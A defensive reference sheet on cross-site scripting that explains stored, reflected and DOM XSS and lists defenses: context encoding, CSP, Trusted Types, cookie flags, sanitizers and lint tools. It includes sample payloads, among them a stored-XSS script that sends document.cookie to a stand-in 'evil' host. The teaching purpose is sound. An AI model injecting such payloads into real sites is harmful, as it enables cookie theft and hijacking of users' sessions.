### XSS — Cross-Site Scripting (Stored, Reflected, DOM)

**What XSS is:** an attacker's JavaScript executes in the victim's browser **in the victim's origin** — so it has the victim's auth, can read their cookies (unless `HttpOnly`), can call your API as them, can keylog and exfiltrate.

**Three flavors:**

| Type | Where the payload lives | Trigger | Blast radius |
|---|---|---|---|
| **Stored (persistent)** | In your database (comment, profile, message) | Any user viewing the page | Largest — everyone who reads the data |
| **Reflected** | In the URL / request, echoed back in response | Victim clicks a crafted link | Per-victim |
| **DOM-based** | In client-side JS handling fragment / params unsafely | Victim opens a crafted URL | Per-victim, server never sees the payload |

**Stored XSS — concrete example:**

```
Attacker posts a comment:
   <script>fetch('https://evil/x?c='+document.cookie)</script>

Server stores it, renders it raw on every viewer's page,
and every reader's browser runs the attacker's script in your origin.
```

**Reflected XSS:**

```
https://app.com/search?q=<script>alert(1)</script>

Server renders: <h1>Results for: <script>alert(1)</script></h1>
```

**DOM-based XSS — server is innocent:**

```js
// Vulnerable — fragment never reaches the server
document.getElementById('out').innerHTML = location.hash.substring(1);
// URL: app.com/#<img src=x onerror=alert(1)>
```

**Defenses (in priority order):**

| Priority | Defense | What it stops |
|---|---|---|
| **1** | **Context-aware output encoding** (use the framework's default) | The fix for stored + reflected XSS |
| 2 | **CSP** (Content Security Policy) | Defense in depth — blocks inline + unauthorized scripts |
| 3 | **`Trusted Types`** (Chromium) | Compiler-level guard against unsafe DOM sinks |
| 4 | **Allowlist-based HTML sanitizer** (DOMPurify, Sanitize, Bleach) | Required when you genuinely must render user-supplied HTML |
| 5 | **`HttpOnly`, `Secure`, `SameSite` cookies** | Limits damage if XSS still happens |
| 6 | **Avoid dangerous DOM sinks** (`innerHTML`, `document.write`, `eval`) | The fix for DOM XSS |
| 7 | **Input validation** | Reduces attack surface; not a primary defense |

**Output encoding by context — same payload, different escape rules:**

| Context | Escape | Example |
|---|---|---|
| HTML body | `&` `<` `>` `"` `'` → entities | `&lt;script&gt;` |
| HTML attribute | Same as body, plus quote it | `<a title="&lt;b&gt;">` |
| JavaScript string literal | `<`, `>`, `'` etc. | `var s = "<script>"` |
| URL parameter | `%`-encoding | `?q=%3Cscript%3E` |
| CSS value | `\3c \3e` | unusual — avoid putting user data in CSS |
| `href`/`src` URL | Reject `javascript:` scheme; only allow `http(s):`, `mailto:` | — |

> **Frameworks do context encoding for you** — Rails `<%= %>`, React JSX, Vue `{{ }}`, Angular text bindings. The danger is **bypassing them**.

**Framework escape hatches — use these only with sanitized input:**

| Framework | Escape hatch | Safer alternative |
|---|---|---|
| Rails | `raw()`, `.html_safe`, `<%== %>`, `sanitize` | Avoid `raw`; if you need HTML, run user input through `sanitize(input, tags: %w[b i a])` |
| React | `dangerouslySetInnerHTML={{ __html: x }}` | DOMPurify the value first |
| Vue | `v-html` | DOMPurify first |
| Angular | `[innerHTML]` (auto-sanitizes) / `bypassSecurityTrustHtml` (don't) | Stick with `[innerHTML]`, avoid the bypass APIs |
| Django | `{% autoescape off %}`, `mark_safe()` | Avoid; sanitize first |
| Lit / vanilla | `el.innerHTML = x` | `el.textContent = x` |

**Dangerous DOM sinks (DOM XSS):**

| Sink | Problem | Replace with |
|---|---|---|
| `el.innerHTML = x` | Parses as HTML | `el.textContent = x` |
| `el.outerHTML = x` | Same | `el.replaceWith(document.createTextNode(x))` |
| `document.write(x)` | Parses as HTML mid-stream | Don't use |
| `eval(x)` / `new Function(x)` | Executes as JS | `JSON.parse` for data |
| `setTimeout(x, …)` / `setInterval(x, …)` with string | Same | Pass a function |
| `el.insertAdjacentHTML(...)` | HTML | `insertAdjacentText` or build nodes |
| `<a href={url}>` with `javascript:` URL | Inline script execution | Validate scheme allowlist |
| `<iframe src={url}>` | Same family | Validate scheme |
| `location.href = userControlled` | Open redirect / `javascript:` | Validate / allowlist hosts |
| `document.domain = x` | Cross-origin escalation | Don't use |

**DOM sources to treat as untrusted:**

| Source | Notes |
|---|---|
| `location.hash` / `search` / `pathname` | Pure client-side; server never sees |
| `document.referrer` | Attacker controls when phishing |
| `document.cookie` | Even your own writes — treat as read-only data |
| `localStorage` / `sessionStorage` / `IndexedDB` | Anything an XSS once wrote |
| `postMessage` event data | Validate `event.origin` AND payload shape |
| `window.name` | Cross-tab attacker channel |
| `URL` fragments parsed into JSON | Validate before use |

**CSP — defense in depth:**

| Directive | Effect |
|---|---|
| `default-src 'self'` | Baseline — only same-origin resources |
| `script-src 'self'` | Block all inline + 3rd-party scripts |
| `script-src 'self' 'nonce-<nonce>'` | Allow scripts that carry a per-response nonce |
| `script-src 'strict-dynamic' 'nonce-...'` | Modern preferred mode — nonce'd scripts may load further scripts |
| `object-src 'none'` | Disable Flash / plugins |
| `base-uri 'self'` | Stop `<base href=evil>` redirect attacks |
| `frame-ancestors 'none'` | Anti-clickjacking |
| `report-uri /csp-report` (legacy) / `report-to` | Browser POSTs violations for monitoring |
| `Content-Security-Policy-Report-Only` | Roll out without breaking — observe first |

> **`unsafe-inline` defeats most CSP value.** If you can't go nonce'd, at least use `'strict-dynamic'`.

**Trusted Types (Chromium-based browsers):**

| Concept | Detail |
|---|---|
| Goal | Block string assignments to dangerous DOM sinks at the compiler/CSP level |
| Activate | `Content-Security-Policy: require-trusted-types-for 'script'` |
| Effect | `el.innerHTML = "<x>"` throws unless wrapped with a registered policy |
| Outcome | Eliminates DOM XSS by construction; needs codebase migration |

**Cookie attributes — limit the damage if XSS still gets through:**

| Attribute | Effect |
|---|---|
| `HttpOnly` | Cookie unreadable from JS — `document.cookie` skips it |
| `Secure` | Only sent over HTTPS |
| `SameSite=Lax` (default in modern browsers) | Cookie not sent on cross-site requests except top-level GET |
| `SameSite=Strict` | Cookie not sent on **any** cross-site request |
| `__Host-` cookie name prefix | Forces `Secure`, `Path=/`, no `Domain` — prevents subdomain hijacks |
| Short expiry | Smaller stolen-cookie window |

> **`HttpOnly` doesn't stop XSS-driven actions** — the JS can still call your API as the user. It just prevents leaking the cookie itself.

**Sanitization (when you genuinely need to render HTML):**

| Library | Language |
|---|---|
| DOMPurify | JavaScript / browser |
| Sanitize gem | Ruby / Rails |
| Bleach | Python |
| OWASP Java HTML Sanitizer | Java |
| sanitize-html | Node |
| HtmlSanitizer | .NET |

| Rule | Why |
|---|---|
| **Allowlist** tags + attributes | Bypass-resistant |
| Never use a **blocklist** | New tags, new attrs, parsing ambiguities — always bypassable |
| Run **server-side** primarily | Client sanitization is bypassable when API is the source of truth |
| Validate URLs (scheme allowlist for `href`/`src`) | `javascript:` schemes |

**Detection in your codebase:**

| Tool | Catches |
|---|---|
| `eslint-plugin-react/no-danger` | `dangerouslySetInnerHTML` usage |
| `eslint-plugin-security` | Raw `innerHTML`, `eval`, etc. |
| `brakeman` (Rails) | `raw`, `html_safe` on user input |
| `bandit` (Python) | `mark_safe`, `format`-with-user-data into templates |
| `semgrep` rules | Cross-language sink-detection |
| CSP report monitoring | Live violations from real users |

**Pitfalls:**

| Pitfall | Effect |
|---|---|
| `dangerouslySetInnerHTML` / `v-html` / `raw` with user input | Direct stored XSS |
| `unsafe-inline` in CSP | CSP silently does nothing meaningful |
| Allowing `javascript:` URLs in `href` | Click-to-execute |
| Sanitizing on the client only | API consumer can submit unsanitized HTML directly |
| Trusting `event.origin` without checking it on `postMessage` | Cross-origin XSS |
| Storing user JSON, then `eval`'ing or unsafe parsing | Code execution |
| Encoding once globally and forgetting context | Right escape for HTML; wrong for JS string |
| Templates that switch contexts (HTML → attr → JS) on the same value | Multi-context bypass |

**Rule of thumb:** **let your framework escape by default; never use the bypass APIs with user input.** **CSP with nonces (or `strict-dynamic`)** as defense in depth — and **never `unsafe-inline`**. **`HttpOnly` + `Secure` + `SameSite` cookies** so a future XSS leaks less. For DOM XSS, **prefer `textContent` over `innerHTML`** and adopt **Trusted Types** if you can. When you must render user HTML, **allowlist via DOMPurify / Sanitize / Bleach on the server**.
